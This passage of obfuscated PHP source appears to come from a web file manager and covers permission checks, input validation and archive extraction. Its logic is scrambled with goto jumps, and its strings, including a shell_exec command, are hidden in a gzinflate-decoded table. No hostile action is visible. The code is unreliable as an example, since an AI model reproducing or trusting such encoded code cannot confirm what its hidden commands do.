self::authCheck($d¶¶¹ãèÙµ, self::AUTH_SHARE); } public static function authCheckComment($f£·Şš‚´÷) { return self::authCheck($f£·Şš‚´÷, self::AUTH_COMMENT); } public static function authCheckEvent($dµŒÕÎ¾Àñ) { return self::authCheck($dµŒÕÎ¾Àñ, self::AUTH_EVENT); } public static function authCheckRoot($Aöá°ñÙ»²) { return self::authCheck($Aöá°ñÙ»², self::AUTH_ROOT); } public static function authDisable($b³—³×‹óÛ, $b–÷­§¬‰¤) { if (intval($b³—³×‹óÛ) <= 0) { return 0; } return intval($b³—³×‹óÛ) & ~$b–÷­§¬‰¤; } public $optionType = "\x53\x79\163\x74\145\155\56\163\157\x75\162\x63\x65\101\165\x74\150\114\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x61\x75\164\x68", "\x6c\x61\142\x65\x6c", "\144\151\163\x70\154\141\x79", "\x73\171\x73\164\145\x6d", "\163\x6f\x72\x74"); public function initData() { $fôéÃ­ğÖ = $this->authDefault(); foreach ($fôéÃ­ğÖ as $F¾ÂÙ†õÃ) { $this->add($F¾ÂÙ†õÃ); } } public function listData($CİÙÀ”Œì = false, $fÃÔÒò« = "\x73\157\x72\164", $bÀËÃÙ¹Ş = false) { return parent::listData($CİÙÀ”Œì, $fÃÔÒò«, $bÀËÃÙ¹Ş); } public function update($AÒ½ˆ¦ÉÄˆ, $Bå«Ú®è·£) { $bÃİ«Ñ„ =& $_SERVER[»„]; $E ©¾¦ = parent::listData($AÒ½ˆ¦ÉÄˆ); $D÷„ÕØ˜‡Õ = $this->findByName($Bå«Ú®è·£[$bÃİ«Ñ„[28]]); if (!$E ©¾¦ || $D÷„ÕØ˜‡Õ && $D÷„ÕØ˜‡Õ[$bÃİ«Ñ„[363]] != $E ©¾¦[$bÃİ«Ñ„[363]]) { return !1; } $this->filterAuth($Bå«Ú®è·£[$bÃİ«Ñ„[372]]); return parent::update($AÒ½ˆ¦ÉÄˆ, $Bå«Ú®è·£); } public function remove($EÂòÇ¾§Å‰) { $C½‘š³çØƒ = parent::listData($EÂòÇ¾§Å‰); if (!$C½‘š³çØƒ || $C½‘š³çØƒ[$_SERVER[»„][1068]]) { return !1; } return parent::remove($EÂòÇ¾§Å‰); } public function add($D·½øíè = array()) { goto BáÜ‰´×; BáÜ‰´×: $aÀÛ‘¥ã¸— =& $_SERVER[»„]; if ($this->findByName($D·½øíè[$aÀÛ‘¥ã¸—[28]])) { return !1; } $c²ÊºŞİ÷¤ = array($aÀÛ‘¥ã¸—[28] => $aÀÛ‘¥ã¸—[33], $aÀÛ‘¥ã¸—[372] => 1, $aÀÛ‘¥ã¸—[2090] => $aÀÛ‘¥ã¸—[2091], $aÀÛ‘¥ã¸—[2092] => 1, $aÀÛ‘¥ã¸—[1068] => 0, $aÀÛ‘¥ã¸—[2093] => 0); goto bíï‰òÌÏÖ; bíï‰òÌÏÖ: $D·½øíè = array_merge($c²ÊºŞİ÷¤, $D·½øíè); $D·½øíè[$aÀÛ‘¥ã¸—[2093]] = $this->getSort(); $this->filterAuth($D·½øíè[$aÀÛ‘¥ã¸—[372]]); goto b•Øœ¿İ»¹; b•Øœ¿İ»¹: return parent::insert($D·½øíè); goto f’”ˆİ®¶³; f’”ˆİ®¶³: } private function getSort() { $c„…ø‚«Ş‘ =& $_SERVER[»„]; $d¸¶í•İîá = parent::listData(); $dÑ°ø‡ƒ°© = array_to_keyvalue($d¸¶í•İîá, $c„…ø‚«Ş‘[33], $c„…ø‚«Ş‘[2093]); return empty($dÑ°ø‡ƒ°©) ? 0 : max($dÑ°ø‡ƒ°©) + 1; } private function filterAuth(&$E½ßĞ‹ÅÏ÷) { goto F¥æ’Ò™³; fÃÄ··Û¦´: foreach ($e©ùµƒ¤ as $f“‰İˆ¾œÄ) { if (isset($e­ĞÎ‘õô[$f“‰İˆ¾œÄ])) { $e©ùµƒ¤ = array_merge($e©ùµƒ¤, $e­ĞÎ‘õô[$f“‰İˆ¾œÄ]); } } $e©ùµƒ¤[] = self::AUTH_SHOW; $E½ßĞ‹ÅÏ÷ = array_sum(array_unique($e©ùµƒ¤)); goto c” ã¸éÇ; döÃ•¯ÌÒ: foreach ($EÒğÆÖØê as $f“‰İˆ¾œÄ) { if ($E½ßĞ‹ÅÏ÷ & $f“‰İˆ¾œÄ) { $e©ùµƒ¤[] = $f“‰İˆ¾œÄ; } } if (in_array(self::AUTH_ROOT, $e©ùµƒ¤)) { $E½ßĞ‹ÅÏ÷ = array_sum($EÒğÆÖØê); return; } $e­ĞÎ‘õô = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto fÃÄ··Û¦´; F¥æ’Ò™³: if (!$E½ßĞ‹ÅÏ÷) { return; } $EÒğÆÖØê = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $e©ùµƒ¤ = array(); goto döÃ•¯ÌÒ; c” ã¸éÇ: } public function sort($eØ°çµ’†, $bÇöÅ‡è) { return parent::update($eØ°çµ’†, $bÇöÅ‡è); } } goto d¯İ´Ò«±Ù; b™•Ÿ¹òğ¡: define($_SERVER[»„][0], $_SERVER[»„][1]); $_SERVER[ÓÊÌ] = explode($_SERVER[»„][2], gzinflate(substr($_SERVER[»„][3], 10, -8))); function Model($A‹Ú¨…»Ç¸ = '', $Cã­”­Å´Ì = '', $EÏáÍ§–Ó¥ = '') { goto bÙ·„ì¢ÉÍ; bÙ·„ì¢ÉÍ: $cêŸ”Ûõ”… =& $_SERVER[ÓÊÌ]; static $Bªà“Ó¬¤ = array(); $c»æ”¯ö”š = strtolower($Cã­”­Å´Ì . $cêŸ”Ûõ”…[0] . $A‹Ú¨…»Ç¸); goto f¢Ï†™÷Ü±; CÅ‡Ú§ Â¦: $Bªà“Ó¬¤[$c»æ”¯ö”š] = new ModelBase($A‹Ú¨…»Ç¸, $Cã­”­Å´Ì, $EÏáÍ§–Ó¥); return $Bªà“Ó¬¤[$c»æ”¯ö”š]; goto AóÂå¦¦Âƒ; f¢Ï†™÷Ü±: if (isset($Bªà“Ó¬¤[$c»æ”¯ö”š])) { return $Bªà“Ó¬¤[$c»æ”¯ö”š]; } if ($A‹Ú¨…»Ç¸) { $A‹Ú¨…»Ç¸ = strtoupper($A‹Ú¨…»Ç¸[0]) . substr($A‹Ú¨…»Ç¸, 1); $D÷ğ¿ƒÚ³ = $A‹Ú¨…»Ç¸ . $cêŸ”Ûõ”…[1]; if (class_exists($D÷ğ¿ƒÚ³)) { $Bªà“Ó¬¤[$c»æ”¯ö”š] = new $D÷ğ¿ƒÚ³(); return $Bªà“Ó¬¤[$c»æ”¯ö”š]; } } if (!$EÏáÍ§–Ó¥) { $EÏáÍ§–Ó¥ = $GLOBALS[$cêŸ”Ûõ”…[2]][$cêŸ”Ûõ”…[3]]; } goto CÅ‡Ú§ Â¦; AóÂå¦¦Âƒ: } goto aò«ã‹¿ô; E£›õµßÜ: if (!function_exists($_SERVER[»„][1844])) { function imagecreatefrombmp($A¼ç£îĞ¿) { return ImageGdBMP::load($A¼ç£îĞ¿); } } class Input { public static function getArray($eœæÅ‡÷Ÿ) { goto Cí§¹ğ›¯·; bæÊñ‘„®: $E¦ÙâĞĞÁµ = array(); $Bö¡é¼ŸÔ§ = LNG($F©ßõ¦«é«[1845]); foreach ($eœæÅ‡÷Ÿ as $AÖ¿´½ÒªÔ => $b…ó­ó›) { goto Bô”ª”ê; e¡ª²ÔŒ°: if (!array_key_exists($AÖ¿´½ÒªÔ, $in)) { if (array_key_exists($F©ßõ¦«é«[1847], $b…ó­ó›)) { if (!is_null($b…ó­ó›[$F©ßõ¦«é«[1847]])) { $EÖ…Ü‚ä[$DÎóÄŒ»‡¢] = $b…ó­ó›[$F©ßõ¦«é«[1847]]; } } else { if (isset($b…ó­ó›[$F©ßõ¦«é«[1848]])) { $E¦ÙâĞĞÁµ[] = $Câ“Å¶ó„; } } continue; } if (isset($b…ó­ó›[$F©ßõ¦«é«[1848]]) && $b…ó­ó›[$F©ßõ¦«é«[1848]] == $F©ßõ¦«é«[278]) { $cÑíŸ‰šàã = json_decode($in[$AÖ¿´½ÒªÔ], !0); if (is_array($cÑíŸ‰šàã)) { $EÖ…Ü‚ä[$DÎóÄŒ»‡¢] = $cÑíŸ‰šàã; } else { if (array_key_exists($F©ßõ¦«é«[1847], $b…ó­ó›)) { if (!is_null($b…ó­ó›[$F©ßõ¦«é«[1847]])) { $EÖ…Ü‚ä[$DÎóÄŒ»‡¢] = $b…ó­ó›[$F©ßõ¦«é«[1847]]; } } else { $E¦ÙâĞĞÁµ[] = $Câ“Å¶ó„; } } continue; } $cÛµ ¨ Ë = _get($b…ó­ó›, $F©ßõ¦«é«[999]); goto B¿“‹“‹¥Ì; B¿“‹“‹¥Ì: if (isset($b…ó­ó›[$F©ßõ¦«é«[1848]]) && !self::check($in[$AÖ¿´½ÒªÔ], $b…ó­ó›[$F©ßõ¦«é«[1848]], $cÛµ ¨ Ë)) { if (array_key_exists($F©ßõ¦«é«[1847], $b…ó­ó›)) { if (!is_null($b…ó­ó›[$F©ßõ¦«é«[1847]])) { $EÖ…Ü‚ä[$DÎóÄŒ»‡¢] = $b…ó­ó›[$F©ßõ¦«é«[1847]]; } } else { $E¦ÙâĞĞÁµ[] = $Câ“Å¶ó„; } continue; } $EÖ…Ü‚ä[$DÎóÄŒ»‡¢] = $in[$AÖ¿´½ÒªÔ]; goto b¥÷ê¢Àƒ·; Bô”ª”ê: $Câ“Å¶ó„ = _get($b…ó­ó›, $F©ßõ¦«é«[1226], $Bö¡é¼ŸÔ§ . $F©ßõ¦«é«[870] . $AÖ¿´½ÒªÔ); $DÎóÄŒ»‡¢ = $AÖ¿´½ÒªÔ; if (isset($b…ó­ó›[$F©ßõ¦«é«[1846]]) && $b…ó­ó›[$F©ßõ¦«é«[1846]]) { $DÎóÄŒ»‡¢ = $b…ó­ó›[$F©ßõ¦«é«[1846]]; } goto e¡ª²ÔŒ°; b¥÷ê¢Àƒ·: } goto f‡¬ªÏÅÕµ; Cí§¹ğ›¯·: $F©ßõ¦«é« =& $_SERVER[»„]; global $in; $EÖ…Ü‚ä = array(); goto bæÊñ‘„®; f‡¬ªÏÅÕµ: if (count($E¦ÙâĞĞÁµ) > 0) { show_json(implode($F©ßõ¦«é«[1849], $E¦ÙâĞĞÁµ), !1); } return $EÖ…Ü‚ä; goto E×º„î­ÆÖ; E×º„î­ÆÖ: } public static function reg($f™ëåÌ‡œ = "\162\145\161\x75\151\162\x65") { static $Fí±ˆ§´é„ = array("\162\x65\x71\165\151\162\145" => "\56\x2b", "\156\x75\x6d\x62\x65\x72" => "\134\144\x2b", "\150\x65\170" => "\133\x30\55\71\x41\55\106\141\55\146\x5d\x2b", "\151\156\164" => "\133\55\134\53\x5d\x3f\x5c\144\x2b", "\142\157\157\x6c" => "\60\174\61", "\146\x6c\x6f\141\x74" => "\133\x2d\134\x2b\135\x3f\x5c\144\x2b\50\x5c\56\x5c\144\x2b\x29\x3f", "\x65\156\x67\x6c\x69\163\x68" => "\x5b\x41\x2d\x5a\x61\x2d\x7a\x20\135\53", "\143\150\x69\156\x65\x73\145" => "\133\134\170\173\64\x65\x30\x30\175\x2d\x5c\x78\x7b\71\x66\141\65\x7d\x5d\53", "\x68\141\x73\103\x68\x69\156\x65\163\x65" => "\x2f\x28\133\x5c\170\173\64\145\x30\60\x7d\55\x5c\170\173\x39\146\141\65\175\135\x2b\51\x2f\x75", "\x65\155\141\151\154" => "\x5c\167\x2b\50\133\x5c\x2e\x5c\55\135\x5c\x77\53\x29\x2a\x5c\100\x5c\167\53\50\133\134\x2e\x5c\x2d\x5d\x5c\167\x2b\x29\52\x5c\x2e\134\167\53", "\x70\150\157\x6e\x65" => "\61\x5b\x33\x2d\71\135\134\x64\x7b\71\175", "\x74\x65\x6c\x70\150\157\156\145" => "\50\x5c\50\x5c\x64\x7b\x33\54\64\175\x5c\x29\174\x5c\144\x7b\63\x2c\x34\175\x2d\174\134\x73\51\77\x5c\144\173\x37\54\x31\x34\x7d", "\165\162\x6c" => "\50\150\x74\164\160\x7c\x66\164\x70\x7c\150\x74\x74\x70\x73\x29\72\x5c\x2f\x5c\57\x5b\x5c\167\134\55\x5f\135\x2b\50\134\x2e\133\134\x77\134\55\137\x5d\x2b\x29\53\x28\133\134\167\x5c\x2d\x5c\x2e\54\x40\77\x5e\75\45\46\x3a\134\57\x7e\134\53\43\x5d\x2a\133\134\x77\134\55\134\x40\77\x5e\75\45\46\x5c\x2f\176\134\53\x23\135\x29\77", "\x75\x72\x6c\x46\165\154\x6c" => "\x5b\x61\55\172\x41\55\x7a\135\x2b\x3a\x5c\57\134\x2f\x5b\136\134\x73\135\x2a", "\151\160" => "\x28\x5c\144\x7b\61\54\x33\x7d\134\56\51\x7b\x33\175\50\x5c\x64\173\x31\54\x33\175\x29", "\x7a\151\160" => "\x5b\61\55\x39\135\134\x64\x7b\x35\x7d\50\77\41\134\144\51", "\x69\x64\103\x61\162\x64" => "\50\134\x64\173\x31\65\x7d\51\174\50\134\144\x7b\61\67\175\x28\134\144\x7c\130\x7c\170\51\51", "\x63\157\x6c\x6f\162" => "\x23\x28\133\x30\x2d\x39\101\55\x46\x61\55\x66\135\173\63\x7d\x7c\133\x30\55\71\101\55\106\x61\x2d\146\x5d\173\66\175\51", "\x74\x69\155\x65" => "\50\133\60\x2d\61\135\x5c\144\x7c\62\133\60\55\64\x5d\51\72\133\x30\x2d\65\x5d\134\x64", "\144\x61\x74\x65" => "\x5c\x64\x7b\x34\175\x5b\x2d\x5c\57\x5d\77\x28\x30\133\61\55\71\x5d\x7c\61\x5b\60\x2d\x32\135\x29\x5b\55\134\57\x5d\77\50\133\60\55\x32\135\x5c\144\x7c\63\133\x30\55\x31\x5d\51", "\x64\141\164\x65\x54\151\x6d\145" => "\134\144\173\64\x7d\133\55\134\57\135\x3f\50\60\x5b\x31\x2d\x39\135\x7c\x31\133\x30\x2d\x32\x5d\x29\x5b\55\134\x2f\135\x3f\50\x5b\x30\x2d\x32\x5d\134\144\x7c\x33\x5b\60\55\x31\135\51\x5c\x73\53\x28\x5b\x30\x2d\61\135\x5c\x64\174\x32\133\x30\55\64\135\51\72\133\60\55\65\x5d\x5c\x64", "\x70\141\163\163\x77\157\x72\144" => "\50\77\75\x2e\52\134\144\x29\50\x3f\75\56\x2a\x5b\x61\x2d\172\135\51\50\77\x3d\x2e\x2a\133\101\x2d\x5a\x5d\x29\56\x7b\x38\54\x32\60\x7d", "\x6b\x65\171" => "\133\x41\55\132\141\55\172\x30\x2d\71\x5f\134\55\134\56\x5d\x2b", "\153\145\171\x46\165\154\154" => "\133\x41\x2d\x5a\141\x2d\x7a\x30\55\x39\137\134\x2d\x5c\56\134\163\54\x5d\x2b"); if (!$f™ëåÌ‡œ) { return $Fí±ˆ§´é„; } return $Fí±ˆ§´é„[$f™ëåÌ‡œ]; } public static function check($BˆºáŞ§Öá, $Fó‰Ø…Î, $b§Øæ…¤Ì = null) { $cêêš°ˆ…á =& $_SERVER[»„]; switch ($Fó‰Ø…Î) { case $cêêš°ˆ…á[7]: return in_array($BˆºáŞ§Öá, $b§Øæ…¤Ì); break; case $cêêš°ˆ…á[1850]: return floatval($BˆºáŞ§Öá) > $b§Øæ…¤Ì; break; case $cêêš°ˆ…á[1851]: return floatval($BˆºáŞ§Öá) < $b§Øæ…¤Ì; break; case $cêêš°ˆ…á[321]: return strlen($BˆºáŞ§Öá) >= $b§Øæ…¤Ì[0] && strlen($BˆºáŞ§Öá) <= $b§Øæ…¤Ì[1]; break; case $cêêš°ˆ…á[321]: if (is_array($b§Øæ…¤Ì)) { return strlen($BˆºáŞ§Öá) >= $b§Øæ…¤Ì[0] && strlen($BˆºáŞ§Öá) <= $b§Øæ…¤Ì[1]; break; } else { return strlen($BˆºáŞ§Öá) == $b§Øæ…¤Ì; break; } case $cêêš°ˆ…á[317]: return floatval($BˆºáŞ§Öá) >= $b§Øæ…¤Ì[0] && floatval($BˆºáŞ§Öá) <= $b§Øæ…¤Ì[1]; break; } $b–‚ÒîÀ—– = self::reg(!1); $Fó‰Ø…Î = isset($b–‚ÒîÀ—–[$Fó‰Ø…Î]) ? $b–‚ÒîÀ—–[$Fó‰Ø…Î] : $Fó‰Ø…Î; if (substr($Fó‰Ø…Î, 0, 1) != $cêêš°ˆ…á[8]) { $Fó‰Ø…Î = $cêêš°ˆ…á[1852] . $Fó‰Ø…Î . $cêêš°ˆ…á[1853]; } return preg_match($Fó‰Ø…Î, $BˆºáŞ§Öá) === 1; } public static function get($CÚ‹Í‹¬, $Eèµ™Í™Ş¸ = null, $CƒÉ²…í†× = null, $fö™«‹òõ = null) { goto EÑçŞÍìÔ®; D¿×™¨®ÒÄ: return $D…šò¡¿[$CÚ‹Í‹¬]; goto AŠö±ùçå; EÑçŞÍìÔ®: $eƒãÎ³÷ó =& $_SERVER[»„]; $d•íĞë·É– = array(); if (!is_null($CƒÉ²…í†×)) { $d•íĞë·É–[$eƒãÎ³÷ó[34]] = $CƒÉ²…í†×; } goto aÚµ†òôáÆ; aÚµ†òôáÆ: if (!is_null($fö™«‹òõ)) { $d•íĞë·É–[$eƒãÎ³÷ó[999]] = $fö™«‹òõ; } if (!is_null($Eèµ™Í™Ş¸)) { $d•íĞë·É–[$eƒãÎ³÷ó[1848]] = $Eèµ™Í™Ş¸; } $D…šò¡¿ = Input::getArray(array($CÚ‹Í‹¬ => $d•íĞë·É–)); goto D¿×™¨®ÒÄ; AŠö±ùçå: } } class KodArchive { static function init() { goto EÚ¡šÉœÃİ; EÚ¡šÉœÃİ: $AÜµÉ¼ =& $_SERVER[»„]; if (defined($AÜµÉ¼[1854])) { return; } define($AÜµÉ¼[1854], SDK_DIR . $AÜµÉ¼[1855]); goto b¦¿Ş‡¦Ó; EÁäèµêÁ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $AÜµÉ¼[1860]; require_once ARCHIVE_LIB . $AÜµÉ¼[1861]; goto C³õÕÚÂšÆ; b¦¿Ş‡¦Ó: define($AÜµÉ¼[1856], TEMP_FILES); define($AÜµÉ¼[1857], TEMP_FILES); define($AÜµÉ¼[1858], $AÜµÉ¼[1859]); goto EÁäèµêÁ; C³õÕÚÂšÆ: require_once ARCHIVE_LIB . $AÜµÉ¼[1862]; require_once ARCHIVE_LIB . $AÜµÉ¼[1863]; require_once ARCHIVE_LIB . $AÜµÉ¼[1864]; goto BÃÀ¾Åá¯; BÃÀ¾Åá¯: require_once ARCHIVE_LIB . $AÜµÉ¼[1865]; goto AÏ˜ÊÃ–²Ò; AÏ˜ÊÃ–²Ò: } static function checkIfType($CÕê§Ñó­, $cÅ¯ÎÅ¾¬ñ) { goto C‰ÅÀ™ÓÌÈ; c×Ô¹ùÁô: $DŞÔâã¸İß = in_array($CÕê§Ñó­, $D›ÖÛª¥Ê[$cÅ¯ÎÅ¾¬ñ]); if ($DŞÔâã¸İß && ($cÅ¯ÎÅ¾¬ñ == $a’ÓéÑ›çö[297] || $cÅ¯ÎÅ¾¬ñ == $a’ÓéÑ›çö[1869]) && (!function_exists($a’ÓéÑ›çö[1877]) || !function_exists($a’ÓéÑ›çö[1878]))) { show_tips($a’ÓéÑ›çö[1879]); } if ($DŞÔâã¸İß && $cÅ¯ÎÅ¾¬ñ == $a’ÓéÑ›çö[1033] && (!function_exists($a’ÓéÑ›çö[1880]) || !strstr(shell_exec($a’ÓéÑ›çö[1881]), $a’ÓéÑ›çö[1882]))) { show_tips($a’ÓéÑ›çö[1883]); } goto BÂ¸±÷š¯; C‰ÅÀ™ÓÌÈ: $a’ÓéÑ›çö =& $_SERVER[»„]; self::init(); $D›ÖÛª¥Ê = array($a’ÓéÑ›çö[297] => array($a’ÓéÑ›çö[297], $a’ÓéÑ›çö[1866], $a’ÓéÑ›çö[1867], $a’ÓéÑ›çö[1868]), $a’ÓéÑ›çö[1869] => array($a’ÓéÑ›çö[1869], $a’ÓéÑ›çö[1870], $a’ÓéÑ›çö[1031], $a’ÓéÑ›çö[1029]), $a’ÓéÑ›çö[1033] => array($a’ÓéÑ›çö[1033], $a’ÓéÑ›çö[1871], $a’ÓéÑ›çö[1872], $a’ÓéÑ›çö[1873], $a’ÓéÑ›çö[1874], $a’ÓéÑ›çö[1875], $a’ÓéÑ›çö[1876])); goto c×Ô¹ùÁô; BÂ¸±÷š¯: return $DŞÔâã¸İß; goto eòò¹»ï¼é; eòò¹»ï¼é: } static function listContent($CŸõŒÛñêÂ, $cÁÃğˆœ¼£ = true) { $C³â¸ô¢¹ =& $_SERVER[»„]; self::init(); $d¨Ôµ…Êªö = !empty($GLOBALS[$C³â¸ô¢¹[1037]]) ? $GLOBALS[$C³â¸ô¢¹[1037]] : get_path_ext($CŸõŒÛñêÂ); $EÁÆ‰çŒäÉ = !1; if (self::checkIfType($d¨Ôµ…Êªö, $C³â¸ô¢¹[1869])) { $fÍì½Ú§Ğê = PclTarList($CŸõŒÛñêÂ, $d¨Ôµ…Êªö); $EÁÆ‰çŒäÉ = array(); for ($a´œ‹ĞÛ¯‰ = 0; $a´œ‹ĞÛ¯‰ < count($fÍì½Ú§Ğê); $a´œ‹ĞÛ¯‰++) { $B‚Ï†¥ô¼¿ = $fÍì½Ú§Ğê[$a´œ‹ĞÛ¯‰]; if ($B‚Ï†¥ô¼¿[$C³â¸ô¢¹[1884]] == $C³â¸ô¢¹[1885] || $B‚Ï†¥ô¼¿[$C³â¸ô¢¹[1884]] == $C³â¸ô¢¹[1886]) { continue; } if ($cÁÃğˆœ¼£) { $B‚Ï†¥ô¼¿[$C³â¸ô¢¹[1887]] = ltrim($B‚Ï†¥ô¼¿[$C³â¸ô¢¹[1887]], $C³â¸ô¢¹[1135]); } if ($B‚Ï†¥ô¼¿[$C³â¸ô¢¹[1884]] == $C³â¸ô¢¹[1888]) { $B‚Ï†¥ô¼¿[$C³â¸ô¢¹[76]] = !0; } else { $B‚Ï†¥ô¼¿[$C³â¸ô¢¹[76]] = !1; } $B‚Ï†¥ô¼¿[$C³â¸ô¢¹[1024]] = $a´œ‹ĞÛ¯‰; $EÁÆ‰çŒäÉ[] = $B‚Ï†¥ô¼¿; } } else { if (self::checkIfType($d¨Ôµ…Êªö, $C³â¸ô¢¹[1033])) { $E’‰œ´‹Ş = kodRarArchive::listContent($CŸõŒÛñêÂ); if (!$E’‰œ´‹Ş[$C³â¸ô¢¹[1020]]) { return $E’‰œ´‹Ş; } else { $EÁÆ‰çŒäÉ = $E’‰œ´‹Ş[$C³â¸ô¢¹[1022]]; } } else { if (kodZipArchive::support($C³â¸ô¢¹[350])) { $EÁÆ‰çŒäÉ = kodZipArchive::listContent($CŸõŒÛñêÂ); } else { $D¥¬÷°±¼ = new PclZip($CŸõŒÛñêÂ); $EÁÆ‰çŒäÉ = $D¥¬÷°±¼->listContent(); } } } if ($EÁÆ‰çŒäÉ) { $CÜšŞ‰Š = unzip_charset_get($EÁÆ‰çŒäÉ); $cÁÃğˆœ¼£ = $cÁÃğˆœ¼£ && function_exists($C³â¸ô¢¹[65]); for ($a´œ‹ĞÛ¯‰ = 0; $a´œ‹ĞÛ¯‰ < count($EÁÆ‰çŒäÉ); $a´œ‹ĞÛ¯‰++) { $EÁÆ‰çŒäÉ[$a´œ‹ĞÛ¯‰][$C³â¸ô¢¹[1887]] = str_replace(array($C³â¸ô¢¹[1060], $C³â¸ô¢¹[1889]), $C³â¸ô¢¹[758], $EÁÆ‰çŒäÉ[$a´œ‹ĞÛ¯‰][$C³â¸ô¢¹[1887]]); if ($cÁÃğˆœ¼£) { $EÁÆ‰çŒäÉ[$a´œ‹ĞÛ¯‰][$C³â¸ô¢¹[1887]] = iconv_to($EÁÆ‰çŒäÉ[$a´œ‹ĞÛ¯‰][$C³â¸ô¢¹[1887]], $CÜšŞ‰Š, $C³â¸ô¢¹[322]); unset($EÁÆ‰çŒäÉ[$a´œ‹ĞÛ¯‰][$C³â¸ô¢¹[1890]]); } } return array($C³â¸ô¢¹[1020] => !0, $C³â¸ô¢¹[1022] => $EÁÆ‰çŒäÉ); } else { return array($C³â¸ô¢¹[1020] => !1, $C³â¸ô¢¹[1022] => $EÁÆ‰çŒäÉ); } } static function extract($C»á‰¿Ó‘–, $c›İĞ¢ßŠ¿, $f…Ì§¸¥‘ = "\x2d\x31", &$F—‡Èï¯Œ = false) { goto a»ˆÒº§Š¬; a»ˆÒº§Š¬: $eÄÙ¯õÑœ =& $_SERVER[»„]; self::init(); $CİÈÂ«¿‡ = !empty($GLOBALS[$eÄÙ¯õÑœ[1037]]) ? $GLOBALS[$eÄÙ¯õÑœ[1037]] : get_path_ext($C»á‰¿Ó‘–); goto cŒîÃ•ŒÍ“; E´“çŠùÍÜ: if (self::checkIfType($CİÈÂ«¿‡, $eÄÙ¯õÑœ[1869])) { if ($f…Ì§¸¥‘ != $eÄÙ¯õÑœ[1019]) { $aéÓÑÔ‰í¦ = unzip_pre_name($aéÓÑÔ‰í¦); $d«ªˆÄø÷à = unzip_pre_name($d«ªˆÄø÷à); $b¾ÆÃÖæŒ¯ = PclTarExtractList($C»á‰¿Ó‘–, array($aéÓÑÔ‰í¦), $c›İĞ¢ßŠ¿, $d«ªˆÄø÷à, $CİÈÂ«¿‡); } else { $b¾ÆÃÖæŒ¯ = PclTarExtract($C»á‰¿Ó‘–, $c›İĞ¢ßŠ¿, $eÄÙ¯õÑœ[357], $CİÈÂ«¿‡); } return array($eÄÙ¯õÑœ[1020] => $b¾ÆÃÖæŒ¯, $eÄÙ¯õÑœ[1022] => PclErrorString(!0)); } else { if (self::checkIfType($CİÈÂ«¿‡, $eÄÙ¯õÑœ[1033])) { return kodRarArchive::extract($C»á‰¿Ó‘–, $c›İĞ¢ßŠ¿, $CİÈÂ«¿‡, $F—‡Èï¯Œ); } else { if (kodZipArchive::support($eÄÙ¯õÑœ[1891])) { return kodZipArchive::extract($C»á‰¿Ó‘–, $c›İĞ¢ßŠ¿, $F—‡Èï¯Œ); } else { $E»¯­Ô•ò = new PclZip($C»á‰¿Ó‘–); if ($f…Ì§¸¥‘ != $eÄÙ¯õÑœ[1019]) { $b¾ÆÃÖæŒ¯ = $E»¯­Ô•ò->extract(PCLZIP_OPT_PATH, $c›İĞ¢ßŠ¿, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $eÄÙ¯õÑœ[1892], PCLZIP_OPT_BY_NAME, $eÊ ¥ŞÇÓª[$eÄÙ¯õÑœ[1887]], PCLZIP_OPT_REMOVE_PATH, $d«ªˆÄø÷à, PCLZIP_OPT_REPLACE_NEWER); } else { $b¾ÆÃÖæŒ¯ = $E»¯­Ô•ò->extract(PCLZIP_OPT_PATH, $c›İĞ¢ßŠ¿, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $eÄÙ¯õÑœ[1892], PCLZIP_OPT_REPLACE_NEWER); } return array($eÄÙ¯õÑœ[1020] => $b¾ÆÃÖæŒ¯, $eÄÙ¯õÑœ[1022] => $E»¯­Ô•ò->errorName(!0)); } } } return array($eÄÙ¯õÑœ[1020] => !1, $eÄÙ¯õÑœ[1022] => $eÄÙ¯õÑœ[1893]); goto aœ¯«‚ší©; cŒîÃ•ŒÍ“: $aù°¦á˜‚ = self::listContent($C»á‰¿Ó‘–, !1); if (!$aù°¦á˜‚[$eÄÙ¯õÑœ[1020]]) { return $aù°¦á˜‚; } if ($f…Ì§¸¥‘ != $eÄÙ¯õÑœ[1019]) { goto d…ÇÖ’ÔÏ‘; fä£Öîäóî: if ($eÊ ¥ŞÇÓª[$eÄÙ¯õÑœ[76]]) { $aéÓÑÔ‰í¦ = rtrim($aéÓÑÔ‰í¦, $eÄÙ¯õÑœ[8]) . $eÄÙ¯õÑœ[8]; $F—‡Èï¯Œ = array($F—‡Èï¯Œ); } $AÉöÌôë·‡ = str_replace($eÄÙ¯õÑœ[93], $eÄÙ¯õÑœ[8], $aéÓÑÔ‰í¦); if (substr($AÉöÌôë·‡, -1) == $eÄÙ¯õÑœ[8]) { if (!strstr(trim($AÉöÌôë·‡, $eÄÙ¯õÑœ[8]), $eÄÙ¯õÑœ[8])) { $c›İĞ¢ßŠ¿ = $c›İĞ¢ßŠ¿ . get_path_this($AÉöÌôë·‡) . $eÄÙ¯õÑœ[8]; } } else { if ($d«ªˆÄø÷à == $aéÓÑÔ‰í¦) { $d«ªˆÄø÷à = $eÄÙ¯õÑœ[33]; } } goto b˜ˆ²Ğçò; d…ÇÖ’ÔÏ‘: $eÊ ¥ŞÇÓª = self::fileIndex($aù°¦á˜‚[$eÄÙ¯õÑœ[1022]], $f…Ì§¸¥‘); $F—‡Èï¯Œ = str_replace(array($eÄÙ¯õÑœ[1060], $eÄÙ¯õÑœ[1889]), $eÄÙ¯õÑœ[70], $eÊ ¥ŞÇÓª[$eÄÙ¯õÑœ[1887]]); $aéÓÑÔ‰í¦ = $F—‡Èï¯Œ; goto d©—È¯ÃÍ; d©—È¯ÃÍ: if ($GLOBALS[$eÄÙ¯õÑœ[6]][$eÄÙ¯õÑœ[1133]] != $eÄÙ¯õÑœ[322]) { $aéÓÑÔ‰í¦ = unzip_pre_name($F—‡Èï¯Œ); } $d«ªˆÄø÷à = 